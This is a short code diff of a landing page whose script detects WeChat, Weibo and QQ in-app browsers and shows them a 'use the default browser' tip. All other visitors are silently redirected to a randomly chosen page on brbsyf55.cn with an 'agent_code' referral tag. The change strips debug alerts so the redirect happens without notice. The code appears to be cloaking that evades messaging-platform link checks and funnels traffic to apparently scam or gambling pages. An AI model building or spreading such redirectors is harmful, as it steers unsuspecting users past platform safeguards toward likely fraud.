@@ -27,7 +27,7 @@
     </style>
 </head>
 
-<body>index2
+<body>
     <span style="display: none">test</span>
     <div id="tip" class="container" style="display: none;">
         <img src="https://gfdg.swsqhj.com/www/1.png" alt="">
@@ -35,20 +35,15 @@
 
     <script>
         let ua = navigator.userAgent;
-        // alert(ua);
         if (/micromessenger/i.test(ua) || ua.indexOf("weibo") > -1 || ua.indexOf(" qq") > -1) {
             document.getElementById("tip").style.display = 'block';
-            alert("请用默认浏览器打开！");
         } else {
             if (window.location.search) {
                 let all = [2, 3, 4, 6]
                 let params = new URLSearchParams(window.location.search);
                 let [agent_code, tp] = [params.get('agent_code') || 231, params.get('tp') || all[Math.floor(Math.random() * all.length)]];
                 let tzurl = "https://brbsyf55.cn/html" + tp + "?agent_code=" + agent_code;
-                alert("点击确定，即将跳转");
                 window.location.replace(tzurl)
-            } else {
-                alert("异常！");
             }
         }
 
